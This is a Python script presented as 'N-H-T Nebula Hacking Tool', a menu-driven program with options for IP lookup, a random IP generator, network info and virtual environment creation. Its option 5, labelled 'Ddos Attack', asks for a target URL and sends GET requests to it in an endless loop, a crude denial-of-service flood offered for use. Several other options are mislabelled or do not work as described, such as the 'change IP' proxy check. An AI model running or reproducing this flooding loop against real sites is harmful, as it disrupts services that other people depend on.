import subprocess
import webbrowser
import random
import requests
import time
import requests

def change_ip(proxy):
    try:
        # Set up the proxy
        proxies = {
            "http": proxy,
            "https": proxy,
        }

        response = requests.get("http://httpbin.org/ip", proxies=proxies)

        print("Your IP address is:", response.json()['origin'])
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    proxy = "http://your_proxy_address:port"
    change_ip(proxy)


def generate_random_ip():
    ip_parts = [str(random.randint(0, 255)) for _ in range(4)]
    return ".".join(ip_parts)

color = "\033[34m"
banner = """



                 ███▄    █ ▓█████  ▄▄▄▄    █    ██  ██▓    ▄▄▄      
                 ██ ▀█   █ ▓█   ▀ ▓█████▄  ██  ▓██▒▓██▒   ▒████▄    
                ▓██  ▀█ ██▒▒███   ▒██▒ ▄██▓██  ▒██░▒██░   ▒██  ▀█▄  
                ▓██▒  ▐▌██▒▒▓█  ▄ ▒██░█▀  ▓▓█  ░██░▒██░   ░██▄▄▄▄██ 
                ▒██░   ▓██░░▒████▒░▓█  ▀█▓▒▒█████▓ ░██████▒▓█   ▓██▒
                ░ ▒░   ▒ ▒ ░░ ▒░ ░░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒▒   ▓▒█░
                ░ ░░   ░ ▒░ ░ ░  ░▒░▒   ░ ░░▒░ ░ ░ ░ ░ ▒  ░ ▒   ▒▒ ░
                   ░   ░ ░    ░    ░    ░  ░░░ ░ ░   ░ ░    ░   ▒   
                         ░    ░  ░ ░         ░         ░  ░     ░  ░
                                        ░                           



"""

print(f"{color}{banner}")

print("[1] help ")
print("[2] Location / lon | lan: ")
print("[3] Unblocker")
print("[4] Random IP ")
print("[5] Ddos Attack ")
print("[6] My IP")
print("[7] Your Network ")
print("[8] Virtual Enviroment")
print("[9] IP info")
print("[0] ")
x = input("Option: ")

if x == "9":
    ip = "8.8.8.8"  
    command = f"curl ipinfo.io/{ip}"

    result = subprocess.run(command, shell=True, text=True, capture_output=True)

    print("Response:")
    print(result.stdout)

    if result.returncode != 0:
        print("Error:", result.stderr)

unblocker = "http://0.0.0.0:8000/"
location = "https://www.google.com.au/maps/@23.8083902,53.5412575,3z?entry=ttu&g_ep=EgoyMDI1MDcwOS4wIKXMDSoASAFQAw%3D%3D"

if x == "2":
    webbrowser.open(location)
    print("opening in browser. . . ")
    time.sleep(0.5)
    print("launching. . . ")
    time.sleep(0.1)
    print("process launched")
elif x == "3":  
    webbrowser.open(unblocker)
    print("opening in browser. . . ")
    time.sleep(0.5)
    print("launching. . . ")
    time.sleep(0.1)
    print("process launched")

elif x == "4":  
    random_ip = generate_random_ip()
    print("Generated random IP:", random_ip)
elif x == "5":
    target = input(" URL to Ddos: ")
    while True: 
          r = requests.get(target)

          print(r.status_code)
elif x == "6":
    command = f"curl ifconfig.me"
    responce = subprocess.run(command, shell=True, text=True, capture_output=True)
    print("Your IP is: ")
    print(responce.stdout)
elif x == "7":
    command  = f"ifconfig"
    process = subprocess.run(command, shell=True, text=True, capture_output=True)
    print("Network Information: ", process)
elif x == "8":
    command = f"python3 -m venv V.E.N.V "
    execute = subprocess.run(command, shell=True, text=True, capture_output=True)
    print("Virual enviroment created",execute)
    time.sleep(1)
    command = f"source V.E.N.V/bin/activate"
    activate = subprocess.run(command, shell=True, text=True, capture_output=True)
    print("Created virtual enviroment")
    time.sleep(0.5)
    print("Launching Process. . . ")
    print("Error 404: This is an error shown when the file V.E.N.V (Virtual Enviroment) is created in this case if you want to acess the virtual enviroment you would need to navigate to the V.E.N.V folder")
elif x == "1":
    BLUE = "\033[34m"
    RESET = "\033[0m"

import os

def center_text(text):
    terminal_width = os.get_terminal_size().columns
    
    text_length = len(text)
    
    padding = (terminal_width - text_length) // 2
    
    centered_text = ' ' * padding + text
    
    return centered_text
banner_2 = ("                                                  This is N-H-T Nebula Hacking Tool                                                                                                     which has multiple tools for hacking                                                                                                    run this script again and select a number                                                                                                   of which tool you want to use                                                                                                                                                                                                                                                                                                                                                                                                                           ")
banner_3 = ("                                   Programmed by TerraBitten / Github : https://github.com/TerraBitten                                                                                                                                                                                      ")

for _ in range(1):
    print(center_text(banner_2))
    print(center_text(banner_3))

